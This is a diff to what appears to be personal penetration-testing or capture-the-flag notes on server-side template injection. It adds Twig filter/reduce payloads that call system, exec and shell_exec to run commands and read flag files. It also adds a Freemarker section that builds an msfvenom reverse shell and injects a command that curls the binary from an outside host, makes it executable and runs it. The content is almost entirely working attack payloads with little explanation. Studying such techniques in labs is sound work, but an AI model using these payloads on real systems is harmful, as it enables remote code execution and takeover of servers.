@@ -167,6 +167,8 @@ RCE:
 
 {{['cat /var/www/flag.txt']|filter('system')|join(',')}}
 
+{{[0]|reduce('system','cat /var/www/flag.txt')}}
+
 {{['cat /var/www/flag.txt']|filter('system')}}
 
 {{['whoami']|filter('system')}}
@@ -179,6 +181,13 @@ RCE:
 
 {{['id',1]|sort('system')|join(',')}}
 
+```
+Different php functions
+
+```
+{{ numbers|reduce('system','whoami')}}
+{{ numbers|reduce('exec','whoami')}}
+{{ numbers|reduce('shell_exec','whoami')}}
 ```
 ##### Freemarker 
 
@@ -273,6 +282,17 @@ Sol:
 ${"freemarker.template.utility.Execute"?new()("cat /root/flag.txt")}
 
 ```
+
+Reverse shelll:
+
+```
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.223 LPORT=443 EXITFUNC=thread -f elf -o revshell
+
+${"freemarker.template.utility.Execute"?new()("curl http://192.168.45.223/revshell -o /tmp/revshell && chmod 777 /tmp/revshell && /tmp/revshell")}
+
+```
+
+
 
 1
 (Apache, 2021), https://freemarker.apache.org/docs/app_faq.html ↩︎
